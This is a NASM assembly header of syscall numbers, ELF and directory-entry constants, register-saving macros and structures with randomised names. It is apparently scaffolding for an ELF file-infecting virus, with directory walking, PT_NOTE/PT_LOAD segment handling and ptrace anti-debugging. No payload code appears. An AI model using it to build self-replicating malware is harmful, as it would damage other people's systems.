; SYSCALL
%define SYS_READ 0
%define SYS_WRITE 1
%define SYS_OPEN 2
%define SYS_CLOSE 3
%define SYS_LSEEK 8
%define SYS_MMAP 9
%define SYS_UNMAP 11
%define SYS_SOCKET 41
%define SYS_CONNECT 42
%define SYS_SENDTO 44
%define SYS_RECVFROM 45
%define SYS_EXIT 60
%define SYS_FTRUNCATE 77
%define SYS_PTRACE 101
%define SYS_GETPPID 110
%define SYS_GETDENTS 217

; SOCKET
%define AF_INET 2
%define SOCK_STREAM 1

; OPEN
%define O_RDONLY 0x0000
%define O_WRONLY 0x0001
%define O_RDWR 0x0002
%define O_DIRECTORY 0q0200000
%define O_CREAT 0x0040

; DIRENT
%define D_INO_OFF 0x00
%define D_FOLDER 0x4
%define D_OFF_OFF 0x08
%define D_REG_FILE 0x8
%define D_RECLEN_OFF 0x10
%define D_TYPE 0x12
%define D_NAME 0x13

; MMAP
%define PROT_EXEC 1
%define PROT_READ 2
%define PROT_WRITE 4
%define MAP_SHARED 1
%define MAP_PRIVATE 2
%define MAP_ANONYMOUS 0x20

; LSEEK
%define SEEK_SET 0x0
%define SEEK_END 0x2

; PTRACE
%define PTRACE_TRACEME 0x0
%define PTRACE_DETACH 0x17

%define CODE_LEN (zxzpDq - _start)
%define FINJMP_OFF (DDekcmO4hj - _start)
%define PAGE_SIZE 0x1000

%define FAM(x) [(rbp - PNcqe97_size) + x]
%define SOCK(x) [(rbp - sock_size) + x]
%define INF(x) [(rbp - kXxam_size) + x]

%define CODE_LEN (zxzpDq - _start)
%define FINJMP_OFF (DDekcmO4hj - _start)
%define PAGE_SIZE 0x1000

struc PNcqe97
.T4Z4Ja7i resb PAGE_SIZE
.nvzbFfnJ: resb PAGE_SIZE
.lR1SO7g resq 1
.Sz74f4K2jt: resd 1
.SBctk5: resd 1
.vZTSMja resq 1
endstruc

struc kXxam
.ZXURQCYBsw resq 1
.TRSlQxq resq 1
.dB12ZXXWDt resq 1
.IMHVCkFifU resb 1
.xbcvKBMaN resq 1
.aiAJTz resq 1
.Mluqny resq 1
.XsysSg resq 1
.k3OSV resq 1 
.JWSTE resq 1
.fv4TFs1 resq 1
.lQJp269 resb 1
.UyLZ1t2l resq 1
.WjaUvgvv resq 1
.zEEX7p resq 1
endstruc

; ELF structures
%define PT_LOAD 0x1
%define PT_NOTE 0x4
%define PF_X 0x1
%define PF_R 0x4
%define SHT_PROGBITS 0x1
%define SHT_STRTAB 0x3
%define SHT_NOTE 0x7
%define SHT_RELA 0x4
%define SHF_ALLOC 0x2
%define SHF_EXECINSTR 0x4

struc WnrtZ
.OD9hCRlIh0: resb 16
.PN3teBGVn: resw 1
.FvFv8M: resw 1
.rIW2hWWQ: resd 1
.BiNot830oh: resq 1
.aFp1TvnSVb: resq 1
.qx9Dgaweg: resq 1
.ZmI97: resd 1
.sOwDSDEIq: resw 1
.srZyngIs1: resw 1
.WDZN9wB0g: resw 1
.GiKvV: resw 1
.vAKct: resw 1
.K3qUp: resw 1
endstruc

struc Wrhx6
.q4Haz: resd 1
.nqTrJMkddY: resd 1
.QkaVj3qo6: resq 1
.FVoofbik: resq 1
.PghubMf2cD: resq 1
.IVpTRklupU: resq 1
.AiRGm7WGp: resq 1
.Oms9D: resq 1
endstruc

struc NU5rLdL4WV
.s2SYH9VD: resd 1
.TBTOwwt: resd 1
.qweMIEjC: resq 1
.wcN0den: resq 1
.jVuKTNmO: resq 1
.UjilW6xSSz: resq 1
.XYslv5nmz: resd 1
.jDv6f4ip34: resd 1
.mHthR38Q resq 1
.OCj4iNB9 resq 1
endstruc

%macro PUSHA 0
push rax
push rbx
push rcx
push rdx
push rsi
push rdi
push r8
push r9
push r10
push r11
push r12
push r13
push r14
push r15
%endmacro

%macro POPA 0
pop r15
pop r14
pop r13
pop r12
pop r11
pop r10
pop r9
pop r8
pop rdi
pop rsi
pop rdx
pop rcx
pop rbx
pop rax
%endmacro 